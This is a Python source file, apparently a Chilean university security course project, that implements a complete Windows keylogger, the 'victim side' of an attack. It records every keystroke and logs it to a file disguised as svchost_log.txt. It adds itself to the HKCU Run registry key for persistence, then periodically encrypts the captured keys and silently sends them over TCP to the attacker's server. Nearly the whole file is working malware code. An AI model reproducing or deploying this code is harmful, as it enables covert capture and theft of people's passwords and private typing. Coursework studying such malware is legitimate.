"""
keylogger.py — Lado víctima
Proyecto Unidad 2 - Seguridad Informática · Universidad de Talca

Flujo completo:
  1. Registra persistencia en el registro de Windows (HKCU\\...\\Run)
  2. Lanza un hilo de envío que cada SEND_INTERVAL segundos cifra y envía el buffer
  3. Inicia el listener de teclado que captura cada tecla pulsada
"""

import os
import sys
import socket
import struct
import threading
import time
import winreg
from datetime import datetime
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config

# ---------------------------------------------------------------------------
# CIFRADO — AES-256-GCM
#
# Por qué AES-256-GCM y no MD5/SHA-256:
#   MD5 y SHA-256 son funciones de HASH (unidireccionales). No cifran:
#   no se puede recuperar el texto original a partir del hash. Son útiles
#   para verificar integridad, NO para ocultar información.
#   AES-256-GCM es cifrado simétrico AUTENTICADO: garantiza confidencialidad
#   (nadie sin la clave puede leer el mensaje) e integridad (el tag de 16
#   bytes detecta si el mensaje fue alterado en tránsito).
# ---------------------------------------------------------------------------

def _encrypt(plaintext: str, key: bytes) -> bytes:
    """
    Cifra texto con AES-256-GCM.

    Parámetros:
        plaintext: texto a cifrar (las teclas capturadas).
        key: clave de 32 bytes (256 bits).

    Retorna:
        bytes: nonce (12 bytes) + ciphertext + tag (16 bytes).
               El nonce es aleatorio por mensaje — nunca se reutiliza con la misma clave.
    """
    nonce = os.urandom(12)
    ciphertext_tag = AESGCM(key).encrypt(nonce, plaintext.encode("utf-8"), None)
    return nonce + ciphertext_tag


# ---------------------------------------------------------------------------
# BUFFER EN MEMORIA
#
# Acumula las teclas capturadas entre envíos.
# El Lock evita condiciones de carrera entre el hilo de captura y el de envío.
# ---------------------------------------------------------------------------

_buffer: list[str] = []
_buffer_lock = threading.Lock()


def _buffer_append(entry: str) -> None:
    """Agrega una entrada al buffer de forma thread-safe."""
    with _buffer_lock:
        _buffer.append(entry)


def _buffer_get_and_clear() -> str:
    """
    Retorna todo el contenido del buffer como string y lo vacía.
    Operación atómica — no se pierden entradas entre leer y limpiar.
    """
    with _buffer_lock:
        if not _buffer:
            return ""
        content = "".join(_buffer)
        _buffer.clear()
        return content


# ---------------------------------------------------------------------------
# CAPTURA DE TECLADO
# ---------------------------------------------------------------------------

def _format_key(key) -> str:
    """
    Convierte un objeto pynput a string legible.
    Teclas normales (a, 1, @) retornan key.char.
    Teclas especiales (enter, shift) retornan [nombre].
    """
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"


def _on_press(key) -> None:
    """
    Callback invocado por pynput en cada tecla pulsada.
    Agrega la tecla con timestamp al buffer y al log local.
    """
    entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {_format_key(key)}\n"
    _buffer_append(entry)
    _write_to_log(entry)


def _write_to_log(entry: str) -> None:
    """
    Escribe la entrada en el archivo de log local (%APPDATA%\\svchost_log.txt).
    Ubicación en APPDATA: no requiere permisos de admin y no llama la atención.
    """
    try:
        with open(config.LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# ENVÍO PERIÓDICO CIFRADO
#
# Protocolo TCP length-prefix:
#   [ 4 bytes big-endian: longitud del payload ][ payload cifrado ]
# Esto permite al servidor saber exactamente cuántos bytes leer.
# ---------------------------------------------------------------------------

def _transmit(payload: bytes) -> None:
    """
    Envía el payload cifrado al servidor del atacante por TCP.
    Si el servidor no está disponible, falla silenciosamente.
    """
    try:
        with socket.create_connection((config.SERVER_HOST, config.SERVER_PORT), timeout=5) as sock:
            sock.sendall(struct.pack(">I", len(payload)) + payload)
    except (socket.error, OSError):
        pass


def _sender_loop(key: bytes) -> None:
    """
    Bucle del hilo de envío. Cada SEND_INTERVAL segundos obtiene el buffer,
    lo cifra y lo transmite. Si el buffer está vacío no envía nada.
    """
    while True:
        time.sleep(config.SEND_INTERVAL)
        content = _buffer_get_and_clear()
        if content:
            _transmit(_encrypt(content, key))


# ---------------------------------------------------------------------------
# PERSISTENCIA — Registro de Windows
#
# Mecanismo: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# Ventaja sobre HKLM: no requiere privilegios de administrador.
# Efecto: Windows ejecuta el binario automáticamente en cada inicio de sesión.
# ---------------------------------------------------------------------------

def _get_exe_path() -> str:
    """
    Retorna la ruta del ejecutable actual.
    sys.frozen = True cuando el script fue compilado con PyInstaller o Nuitka.
    En ese caso apunta al .exe; de lo contrario apunta al .py.
    """
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


def _add_to_startup() -> None:
    """Registra el ejecutable en la clave Run del registro de Windows."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, config.APP_NAME, 0, winreg.REG_SZ, _get_exe_path())
        winreg.CloseKey(key)
    except OSError:
        pass


def _is_in_startup() -> bool:
    """Verifica si ya existe la entrada de persistencia en el registro."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ,
        )
        winreg.QueryValueEx(key, config.APP_NAME)
        winreg.CloseKey(key)
        return True
    except OSError:
        return False


# ---------------------------------------------------------------------------
# PUNTO DE ENTRADA
# ---------------------------------------------------------------------------

def main() -> None:
    if not _is_in_startup():
        _add_to_startup()

    key = bytes.fromhex(config.ENCRYPTION_KEY)
    threading.Thread(target=_sender_loop, args=(key,), daemon=True).start()

    with keyboard.Listener(on_press=_on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
